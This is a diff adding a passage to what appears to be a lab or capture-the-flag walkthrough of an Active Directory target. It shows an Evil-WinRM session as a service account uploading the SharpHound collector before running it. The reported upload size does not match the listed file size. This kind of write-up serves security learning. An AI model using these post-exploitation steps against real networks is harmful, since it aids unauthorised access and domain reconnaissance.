@@ -283,7 +283,28 @@ Info: Establishing connection to remote endpoint
 ```
 I now have access over WINRM, so now i can upload sharphound
 
+```python
+*Evil-WinRM* PS C:\Users\ATHENA_SVC\Documents> upload SharpHound.exe
+                                        
+Info: Uploading /home/kali/hsm/martiniAD/SharpHound.exe to C:\Users\ATHENA_SVC\Documents\SharpHound.exe
+                                        
+Data: 1802240 bytes of 1802240 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\ATHENA_SVC\Documents> dir
 
+
+    Directory: C:\Users\ATHENA_SVC\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/15/2026  12:57 PM        1351680 SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\ATHENA_SVC\Documents>
+```
+Now the .exe is uploaded, i can execute 
 
 
 
